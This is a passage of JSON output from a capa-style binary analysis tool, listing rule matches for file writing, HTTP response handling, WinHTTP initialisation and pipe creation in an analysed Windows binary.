                      "type": "api",
                      "api": "System.IO.File::WriteAllText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllTextAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendAllLines"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendAllLinesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendAllText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendAllTextAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.FileInfo::AppendText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "subscope",
                              "scope": "basic block"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 1073741824,
                                      "description": "GENERIC_WRITE"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 2,
                                      "description": "FILE_WRITE_DATA"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 6442463596
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "match",
                                      "match": "create or open file"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442463596
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "match",
                              "match": "write file on Windows/38a6be563e9a45669b4c21957bc154d9"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WriteFile"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442463506
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WriteFileEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtWriteFile"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ZwWriteFile"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "_fwrite"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "fwrite"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442616216
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllBytes"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllBytesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllLines"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllLinesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllTextAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendAllLines"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendAllLinesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendAllText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendAllTextAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.FileInfo::AppendText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "subscope",
                              "scope": "basic block"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 1073741824,
                                      "description": "GENERIC_WRITE"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 2,
                                      "description": "FILE_WRITE_DATA"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 6442616915
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "match",
                                      "match": "create or open file"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 1073741824,
                                      "description": "GENERIC_WRITE"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 2,
                                      "description": "FILE_WRITE_DATA"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 6442616868
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "match",
                                      "match": "create or open file"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442616912
                            },
                            {
                              "type": "absolute",
                              "value": 6442616847
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "match",
                              "match": "write file on Windows/38a6be563e9a45669b4c21957bc154d9"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WriteFile"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442617125
                            },
                            {
                              "type": "absolute",
                              "value": 6442617055
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WriteFileEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtWriteFile"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ZwWriteFile"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "_fwrite"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "fwrite"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442618712
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllBytes"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllBytesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllLines"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllLinesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllTextAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendAllLines"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendAllLinesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendAllText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendAllTextAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.FileInfo::AppendText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "subscope",
                              "scope": "basic block"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 1073741824,
                                      "description": "GENERIC_WRITE"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 2,
                                      "description": "FILE_WRITE_DATA"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 6442619081
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "match",
                                      "match": "create or open file"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 1073741824,
                                      "description": "GENERIC_WRITE"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 2,
                                      "description": "FILE_WRITE_DATA"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 6442619124
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "match",
                                      "match": "create or open file"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 1073741824,
                                      "description": "GENERIC_WRITE"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 2,
                                      "description": "FILE_WRITE_DATA"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 6442618883
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "match",
                                      "match": "create or open file"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442619081
                            },
                            {
                              "type": "absolute",
                              "value": 6442619124
                            },
                            {
                              "type": "absolute",
                              "value": 6442618878
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "match",
                              "match": "write file on Windows/38a6be563e9a45669b4c21957bc154d9"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WriteFile"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442619317
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WriteFileEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtWriteFile"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ZwWriteFile"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "_fwrite"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "fwrite"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "receive HTTP response": {
        "meta": {
          "name": "receive HTTP response",
          "namespace": "communication/http/client",
          "authors": [
            "michael.hunhoff@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "span of calls"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "Communication",
                "HTTP Communication",
                "Get Response"
              ],
              "objective": "Communication",
              "behavior": "HTTP Communication",
              "method": "Get Response",
              "id": "C0002.017"
            }
          ],
          "references": [],
          "examples": [
            "6A352C3E55E8AE5ED39DC1BE7FB964B1:0x10002790"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: receive HTTP response\r\n    namespace: communication/http/client\r\n    authors:\r\n      - michael.hunhoff@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: span of calls\r\n    mbc:\r\n      - Communication::HTTP Communication::Get Response [C0002.017]\r\n    examples:\r\n      - 6A352C3E55E8AE5ED39DC1BE7FB964B1:0x10002790\r\n  features:\r\n    - or:\r\n      - api: System.Net.WebRequest::GetResponse\r\n      - api: winhttp.WinHttpReceiveResponse\r\n      - and:\r\n        - api: winhttp.WinHttpReadData\r\n        - optional:\r\n          - api: winhttp.WinHttpQueryDataAvailable\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442459776
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Net.WebRequest::GetResponse"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "WinHttpReceiveResponse"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442460102
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "WinHttpReadData"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 6442460179
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WinHttpQueryDataAvailable"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442460129
                            }
                          ],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "create pipe": {
        "meta": {
          "name": "create pipe",
          "namespace": "communication/named-pipe/create",
          "authors": [
            "moritz.raabe@mandiant.com",
            "michael.hunhoff@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "call"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "Communication",
                "Interprocess Communication",
                "Create Pipe"
              ],
              "objective": "Communication",
              "behavior": "Interprocess Communication",
              "method": "Create Pipe",
              "id": "C0003.001"
            }
          ],
          "references": [],
          "examples": [
            "Practical Malware Analysis Lab 03-02.dll_:0x10003a13"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: create pipe\r\n    namespace: communication/named-pipe/create\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n      - michael.hunhoff@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: call\r\n    mbc:\r\n      - Communication::Interprocess Communication::Create Pipe [C0003.001]\r\n    examples:\r\n      - Practical Malware Analysis Lab 03-02.dll_:0x10003a13\r\n  features:\r\n    - or:\r\n      - api: kernel32.CreatePipe\r\n      - api: kernel32.CreateNamedPipe\r\n      - api: System.IO.Pipes.AnonymousPipeClientStream::ctor\r\n      - api: System.IO.Pipes.NamedPipeClientStream::ctor\r\n      - api: System.IO.Pipes.AnonymousPipeServerStream::ctor\r\n      - api: System.IO.Pipes.AnonymousPipeServerStreamAcl::Create\r\n      - api: System.IO.Pipes.NamedPipeServerStream::ctor\r\n      - api: System.IO.Pipes.NamedPipeServerStreamAcl::Create\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442467776
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreatePipe"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442467994
                    },
                    {
                      "type": "absolute",
                      "value": 6442467966
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateNamedPipe"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.Pipes.AnonymousPipeClientStream::ctor"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.Pipes.NamedPipeClientStream::ctor"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.Pipes.AnonymousPipeServerStream::ctor"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.Pipes.AnonymousPipeServerStreamAcl::Create"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.Pipes.NamedPipeServerStream::ctor"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.Pipes.NamedPipeServerStreamAcl::Create"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "initialize WinHTTP library": {
        "meta": {
          "name": "initialize WinHTTP library",
          "namespace": "communication/http",
          "authors": [
            "michael.hunhoff@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "call"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "Communication",
                "HTTP Communication",
                "WinHTTP"
              ],
              "objective": "Communication",
              "behavior": "HTTP Communication",
              "method": "WinHTTP",
              "id": "C0002.008"
            }
          ],
          "references": [],
          "examples": [
            "6A352C3E55E8AE5ED39DC1BE7FB964B1:0x1000E670"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: initialize WinHTTP library\r\n    namespace: communication/http\r\n    authors:\r\n      - michael.hunhoff@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: call\r\n    mbc:\r\n      - Communication::HTTP Communication::WinHTTP [C0002.008]\r\n    examples:\r\n      - 6A352C3E55E8AE5ED39DC1BE7FB964B1:0x1000E670\r\n  features:\r\n    - and:\r\n      - api: winhttp.WinHttpOpen\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442467776
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "WinHttpOpen"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442468316
                    }
                  ],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "create two anonymous pipes": {
        "meta": {
          "name": "create two anonymous pipes",
          "namespace": "communication/named-pipe/create",
          "authors": [
            "matthew.williams@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "span of calls"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "Communication",
                "Interprocess Communication",
                "Create Pipe"
              ],
              "objective": "Communication",
              "behavior": "Interprocess Communication",
              "method": "Create Pipe",
              "id": "C0003.001"
            }
          ],
          "references": [],
          "examples": [
            "Practical Malware Analysis Lab 14-02.exe_:0x4011C0"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
